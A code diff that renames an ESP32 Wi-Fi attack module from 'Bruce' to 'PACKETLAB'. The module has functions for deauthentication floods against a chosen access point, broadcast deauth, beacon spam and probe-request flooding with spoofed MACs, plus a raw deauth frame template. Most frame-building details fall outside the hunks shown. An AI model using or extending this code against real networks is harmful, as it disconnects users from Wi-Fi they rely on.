@@ -1,4 +1,4 @@
-#include "bruce_wifi.h"
+#include "packetlab_wifi.h"
 #if !defined(NEONDRIVE_TARGET_M5TAB5)
 #include <esp_wifi.h>
 #include <cstring>
@@ -7,17 +7,17 @@
 #include <stdarg.h>
 
 // ==========================================
-// Bruce WiFi Attack Implementation (Enhanced)
+// PACKETLAB WiFi Attack Implementation (Enhanced)
 // ==========================================
 
 // State tracking
-static BruceAttackType gCurrentAttack = BruceAttackType::NONE;
+static PACKETLABAttackType gCurrentAttack = PACKETLABAttackType::NONE;
 static uint32_t gAttackStartMs = 0;
 static uint16_t gAttackDurationMs = 0;
-static BruceTarget gTarget = {};
+static PACKETLABTarget gTarget = {};
 static bool gAttackActive = false;
-static BruceConfig gConfig;
-static BruceStats gStats = {};
+static PACKETLABConfig gConfig;
+static PACKETLABStats gStats = {};
 static char gLastError[128] = {0};
 static uint8_t gRandomMAC[6] = {};
 
@@ -25,7 +25,7 @@ static uint8_t gRandomMAC[6] = {};
 static SemaphoreHandle_t attackMutex = nullptr;
 
 // Optional per-frame TX callback (set by main.cpp for PCAP logging)
-static BruceFrameTxCallback gFrameCb = nullptr;
+static PACKETLABFrameTxCallback gFrameCb = nullptr;
 
 // Deauth frame template (26 bytes) - from deauther.cpp pattern
 const uint8_t DEAUTH_FRAME_TEMPLATE[26] = {
@@ -58,7 +58,7 @@ static void logError(const char* fmt, ...) {
     va_end(args);
     
     if (gConfig.verboseLogging) {
-        Serial.printf("[BRUCE] ERROR: %s\n", gLastError);
+        Serial.printf("[PACKETLAB] ERROR: %s\n", gLastError);
     }
 }
 
@@ -71,7 +71,7 @@ static void logInfo(const char* fmt, ...) {
     vsnprintf(buf, sizeof(buf), fmt, args);
     va_end(args);
     
-    Serial.printf("[BRUCE] %s\n", buf);
+    Serial.printf("[PACKETLAB] %s\n", buf);
 }
 
 static void generateRandomMAC(uint8_t* mac) {
@@ -83,25 +83,25 @@ static void generateRandomMAC(uint8_t* mac) {
     mac[0] &= 0xFE;
 }
 
-String bruceFormatMAC(const uint8_t* mac) {
+String PACKETLABFormatMAC(const uint8_t* mac) {
     char buf[18];
     snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
              mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     return String(buf);
 }
 
-void bruceInit() {
+void PACKETLABInit() {
     if (!attackMutex) {
         attackMutex = xSemaphoreCreateMutex();
     }
-    gCurrentAttack = BruceAttackType::NONE;
+    gCurrentAttack = PACKETLABAttackType::NONE;
     gAttackActive = false;
     memset(&gStats, 0, sizeof(gStats));
     memset(gLastError, 0, sizeof(gLastError));
     generateRandomMAC(gRandomMAC);
-    gConfig = BruceConfig();  // Default config
+    gConfig = PACKETLABConfig();  // Default config
     
-    logInfo("Bruce WiFi Attack Module initialized");
+    logInfo("PACKETLAB WiFi Attack Module initialized");
 }
 
 // Build a deauth frame (following deauther.cpp pattern)
@@ -275,7 +275,7 @@ static esp_err_t sendRawFrame(const uint8_t* frame, size_t len) {
     return r;
 }
 
-void bruceSetFrameCallback(BruceFrameTxCallback cb) {
+void PACKETLABSetFrameCallback(PACKETLABFrameTxCallback cb) {
     gFrameCb = cb;
 }
 
@@ -288,11 +288,11 @@ static void stopAttackLocked() {
         // Stop the temporary AP
         stopAttackAP();
         gAttackActive = false;
-        gCurrentAttack = BruceAttackType::NONE;
+        gCurrentAttack = PACKETLABAttackType::NONE;
     }
 }
 
-void bruceStartDeauthFlood(const BruceTarget& target, uint16_t durationMs) {
+void PACKETLABStartDeauthFlood(const PACKETLABTarget& target, uint16_t durationMs) {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         logError("Attack mutex timeout");
         return;
@@ -311,7 +311,7 @@ void bruceStartDeauthFlood(const BruceTarget& target, uint16_t durationMs) {
         return;
     }
     
-    gCurrentAttack = BruceAttackType::DEAUTH_FLOOD;
+    gCurrentAttack = PACKETLABAttackType::DEAUTH_FLOOD;
     gAttackStartMs = millis();
     gAttackDurationMs = durationMs;
     gAttackActive = true;
@@ -319,12 +319,12 @@ void bruceStartDeauthFlood(const BruceTarget& target, uint16_t durationMs) {
     gStats.startTimeMs = gAttackStartMs;
     
     logInfo("Deauth flood on %s (%s) CH%d for %dms",
-            target.ssid, bruceFormatMAC(target.bssid).c_str(), target.channel, durationMs);
+            target.ssid, PACKETLABFormatMAC(target.bssid).c_str(), target.channel, durationMs);
     
     xSemaphoreGive(attackMutex);
 }
 
-void bruceStartBeaconSpam(const char* ssid, uint8_t channel, uint16_t durationMs, const BruceTarget* broadcastBssid) {
+void PACKETLABStartBeaconSpam(const char* ssid, uint8_t channel, uint16_t durationMs, const PACKETLABTarget* broadcastBssid) {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         logError("Attack mutex timeout");
         return;
@@ -347,7 +347,7 @@ void bruceStartBeaconSpam(const char* ssid, uint8_t channel, uint16_t durationMs
         return;
     }
     
-    gCurrentAttack = BruceAttackType::BEACON_SPAM;
+    gCurrentAttack = PACKETLABAttackType::BEACON_SPAM;
     gAttackStartMs = millis();
     gAttackDurationMs = durationMs;
     gAttackActive = true;
@@ -356,13 +356,13 @@ void bruceStartBeaconSpam(const char* ssid, uint8_t channel, uint16_t durationMs
     
     logInfo("Beacon spam for SSID '%s' (BSSID: %s) on CH%d for %dms",
             ssid ? ssid : "unknown",
-            bruceFormatMAC(gTarget.bssid).c_str(),
+            PACKETLABFormatMAC(gTarget.bssid).c_str(),
             channel, durationMs);
     
     xSemaphoreGive(attackMutex);
 }
 
-void bruceStartProbeFlood(const char* ssid, uint8_t channel, uint16_t durationMs) {
+void PACKETLABStartProbeFlood(const char* ssid, uint8_t channel, uint16_t durationMs) {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         logError("Attack mutex timeout");
         return;
@@ -380,7 +380,7 @@ void bruceStartProbeFlood(const char* ssid, uint8_t channel, uint16_t durationMs
         return;
     }
     
-    gCurrentAttack = BruceAttackType::PROBE_FLOOD;
+    gCurrentAttack = PACKETLABAttackType::PROBE_FLOOD;
     gAttackStartMs = millis();
     gAttackDurationMs = durationMs;
     gAttackActive = true;
@@ -393,7 +393,7 @@ void bruceStartProbeFlood(const char* ssid, uint8_t channel, uint16_t durationMs
     xSemaphoreGive(attackMutex);
 }
 
-void bruceStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
+void PACKETLABStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         logError("Attack mutex timeout");
         return;
@@ -411,7 +411,7 @@ void bruceStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
         return;
     }
     
-    gCurrentAttack = BruceAttackType::DEAUTH_BROADCAST;
+    gCurrentAttack = PACKETLABAttackType::DEAUTH_BROADCAST;
     gAttackStartMs = millis();
     gAttackDurationMs = durationMs;
     gAttackActive = true;
@@ -423,7 +423,7 @@ void bruceStartDeauthBroadcast(uint8_t channel, uint16_t durationMs) {
     xSemaphoreGive(attackMutex);
 }
 
-void bruceStopAttack() {
+void PACKETLABStopAttack() {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         return;
     }
@@ -431,26 +431,26 @@ void bruceStopAttack() {
     xSemaphoreGive(attackMutex);
 }
 
-bool bruceIsAttacking() {
+bool PACKETLABIsAttacking() {
     return gAttackActive;
 }
 
-const char* bruceGetAttackName() {
+const char* PACKETLABGetAttackName() {
     switch (gCurrentAttack) {
-        case BruceAttackType::DEAUTH_FLOOD:
+        case PACKETLABAttackType::DEAUTH_FLOOD:
             return "Deauth Flood";
-        case BruceAttackType::DEAUTH_BROADCAST:
+        case PACKETLABAttackType::DEAUTH_BROADCAST:
             return "Deauth Broadcast";
-        case BruceAttackType::BEACON_SPAM:
+        case PACKETLABAttackType::BEACON_SPAM:
             return "Beacon Spam";
-        case BruceAttackType::PROBE_FLOOD:
+        case PACKETLABAttackType::PROBE_FLOOD:
             return "Probe Flood";
         default:
             return "Idle";
     }
 }
 
-BruceStats bruceGetStats() {
+PACKETLABStats PACKETLABGetStats() {
     if (gAttackActive && gAttackStartMs > 0) {
         gStats.elapsedMs = millis() - gAttackStartMs;
         if (gStats.elapsedMs > 0) {
@@ -460,15 +460,15 @@ BruceStats bruceGetStats() {
     return gStats;
 }
 
-BruceAttackType bruceGetCurrentAttackType() {
+PACKETLABAttackType PACKETLABGetCurrentAttackType() {
     return gCurrentAttack;
 }
 
-const char* bruceGetLastError() {
+const char* PACKETLABGetLastError() {
     return gLastError;
 }
 
-void bruceSetConfig(const BruceConfig& cfg) {
+void PACKETLABSetConfig(const PACKETLABConfig& cfg) {
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
         return;
     }
@@ -478,12 +478,12 @@ void bruceSetConfig(const BruceConfig& cfg) {
     xSemaphoreGive(attackMutex);
 }
 
-BruceConfig bruceGetConfig() {
+PACKETLABConfig PACKETLABGetConfig() {
     return gConfig;
 }
 
 // Main attack loop (call frequently from main loop)
-void bruceAttackTick() {
+void PACKETLABAttackTick() {
     if (!gAttackActive) return;
     
     if (xSemaphoreTake(attackMutex, pdMS_TO_TICKS(50)) != pdTRUE) {
@@ -505,7 +505,7 @@ void bruceAttackTick() {
     
     // Execute attack tick
     switch (gCurrentAttack) {
-        case BruceAttackType::DEAUTH_FLOOD: {
+        case PACKETLABAttackType::DEAUTH_FLOOD: {
             // Send both target-specific and broadcast deauth
             if (millis() - lastSend > gConfig.floodIntervalMs) {
                 lastSend = millis();
@@ -526,7 +526,7 @@ void bruceAttackTick() {
             break;
         }
         
-        case BruceAttackType::DEAUTH_BROADCAST: {
+        case PACKETLABAttackType::DEAUTH_BROADCAST: {
             // Broadcast deauth: random source, broadcast dest/BSSID
             if (millis() - lastSend > gConfig.floodIntervalMs) {
                 lastSend = millis();
@@ -542,7 +542,7 @@ void bruceAttackTick() {
             break;
         }
         
-        case BruceAttackType::BEACON_SPAM: {
+        case PACKETLABAttackType::BEACON_SPAM: {
             // Full beacon frame with SSID
             if (millis() - lastSend > gConfig.floodIntervalMs) {
                 lastSend = millis();
@@ -555,7 +555,7 @@ void bruceAttackTick() {
             break;
         }
         
-        case BruceAttackType::PROBE_FLOOD: {
+        case PACKETLABAttackType::PROBE_FLOOD: {
             // Probe request flooding with spoofed MACs
             if (millis() - lastSend > gConfig.floodIntervalMs) {
                 lastSend = millis();
@@ -578,12 +578,12 @@ void bruceAttackTick() {
 }
 
 // UI stubs (called from main.cpp)
-// drawBruceMenu() is implemented in main.cpp where it has access to the
-// Button struct, bruceMenuBtns[], tft, and the draw helpers.
+// drawPACKETLABMenu() is implemented in main.cpp where it has access to the
+// Button struct, PACKETLABMenuBtns[], tft, and the draw helpers.
 
-void bruceMenuTick() {
+void PACKETLABMenuTick() {
     // Attack loop
-    bruceAttackTick();
+    PACKETLABAttackTick();
 }
 
 #endif // !NEONDRIVE_TARGET_M5TAB5
